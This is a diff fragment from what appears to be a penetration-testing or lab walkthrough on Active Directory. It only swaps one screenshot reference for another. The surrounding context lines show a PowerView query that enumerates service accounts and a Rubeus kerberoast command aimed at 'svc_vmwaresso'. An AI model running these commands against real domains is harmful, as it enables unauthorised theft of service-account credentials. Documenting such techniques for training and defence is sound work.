@@ -258,7 +258,7 @@ Get-DomainUser * -spn | select samaccountname, serviceprincipalname
 .\Rubeus.exe kerberoast /nowrap /user:svc_vmwaresso
 ```
 
-<figure><img src="../../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../../.gitbook/assets/image (59) (1).png" alt=""><figcaption><p>Virtual01</p></figcaption></figure>
 
